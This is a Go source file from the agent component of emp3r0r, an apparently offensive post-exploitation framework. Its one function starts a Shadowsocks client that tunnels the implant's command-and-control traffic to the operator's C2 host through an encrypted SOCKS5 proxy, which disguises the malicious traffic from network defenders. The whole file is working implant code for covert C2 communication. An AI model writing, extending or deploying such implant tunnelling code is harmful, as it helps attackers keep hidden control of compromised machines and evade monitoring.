package agent

import (
	"fmt"
	"log"

	"github.com/jm33-m0/emp3r0r/core/lib/ss"
)

// Start ShadowsocksC2Client client, you get a SOCKS5 proxy server at *:Runtime.ShadowsocksPort
// This proxy server is responsible for encapsulating C2 traffic
func ShadowsocksC2Client() {
	log.Printf("C2 traffic will go through Shadowsocks: %s:%s",
		RuntimeConfig.CCHost,
		RuntimeConfig.ShadowsocksPort)
	server_addr := fmt.Sprintf("%s:%s", RuntimeConfig.CCHost, RuntimeConfig.ShadowsocksPort)
	err := ss.SSMain(server_addr, "127.0.0.1:"+RuntimeConfig.ShadowsocksPort, ss.AEADCipher,
		RuntimeConfig.ShadowsocksPassword, false, false)
	if err != nil {
		log.Printf("ShadowsocksProxy failed to start: %v", err)
		return
	}
}
